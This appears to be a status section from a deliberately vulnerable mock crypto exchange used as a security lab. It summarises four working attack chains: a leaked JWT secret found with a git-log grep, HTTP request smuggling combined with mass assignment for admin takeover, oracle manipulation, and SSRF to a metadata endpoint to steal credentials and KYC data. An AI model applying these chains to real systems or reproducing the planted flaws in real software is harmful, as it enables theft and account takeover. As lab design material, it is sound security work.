- **CHAIN A — Drain the hot wallet: CLOSED, end-to-end zero-knowledge.** Components landed = V-48 (git-history JWT secret leak, Phase 9) + V-19 (forge admin JWT via leaked key) + V-6 (`/api/v1/internal/*` middleware-trust bypass) + `/api/v1/internal/treasury/emergency-withdraw` terminal endpoint (Phase 8) + V-33 (PSBT validate-vs-broadcast mismatch in the treasury coordinator). A zero-knowledge attacker reads the public repo, runs `git log --all -p | grep -i jwt_secret`, forges an admin JWT, hits the internal namespace with `x-bvbe-internal-trace: 1`, and submits a polyglot PSBT that drains the hot wallet to an attacker-controlled output. See `docs/phases/phase-9/adversarial-qa.md` §CHAIN A for the curl PoC.
- **CHAIN B — Become admin and persist: CLOSED, end-to-end.** Components landed = V-50 (nginx CL/TE-tolerant directives **+** upstream `NODE_OPTIONS=--insecure-http-parser`, both planted Phase 9) + V-51 (mass-assignment on `PATCH /api/v2/me`, Phase 9 fix-up). A zero-knowledge attacker pipelines a smuggled `PATCH /api/v2/me {"role":"admin"}` into a legitimate user's TCP connection; nginx forwards both `Content-Length` and `Transfer-Encoding`, and the upstream Node parser — running with `--insecure-http-parser` — accepts the ambiguity, desyncs on the chunked terminator, and processes the smuggled bytes as a second request authenticated by the legitimate user's session. V-51's permissive validator forwards `{role:"admin"}` verbatim to `prisma.user.update`, promoting them to admin. The promoted user then plants a second admin row via `POST /api/v2/admin/users` (or a second smuggled `PATCH` against another victim's session) for persistence across a `docker-compose down` (no `-v`). V-22 (Server Action mass assignment on `editOrder`) is **not** part of this chain — it is a standalone plant on order editing with financial-impact reach, not user-role reach. Alternate JWT-exfil entry routes (V-35 + V-41, V-1, V-18) remain available as alternate admin-acquisition paths. See `docs/phases/phase-9/adversarial-qa.md` §CHAIN B.
- **CHAIN C — Mass user takeover via oracle: CLOSED, end-to-end as of Phase 5.** Components: V-25 (self-trade → oracle manipulation), nginx `proxy_cache` infrastructure for `/api/v2/public/*`, and the Phase-5 liquidation engine consuming the manipulated oracle via HTTP-fetched public price feed. Phase 9 re-verifies against a fresh stack; no new plant required. See `docs/phases/phase-5/adversarial-qa.md` and `docs/phases/phase-9/adversarial-qa.md` §CHAIN C.
- **CHAIN D — Exfiltrate full user DB + KYC: CLOSED, two paths end-to-end.** Path 1 (fast): V-48 + V-6 → `GET /api/v1/internal/users` returns the full user DB with `passwordHash` and `totpSecret`. Path 2 (SSRF, original architecture): V-40 (KYC URL-import SSRF) → `mock-imds` at `169.254.169.254` → synthetic IAM credentials → `mock-s3` at `s3.bvbe.internal/kyc-bucket/` → synthetic KYC documents. Both `mock-imds` and `mock-s3` ship as docker-compose services in Phase 9. See `docs/phases/phase-9/adversarial-qa.md` §CHAIN D.
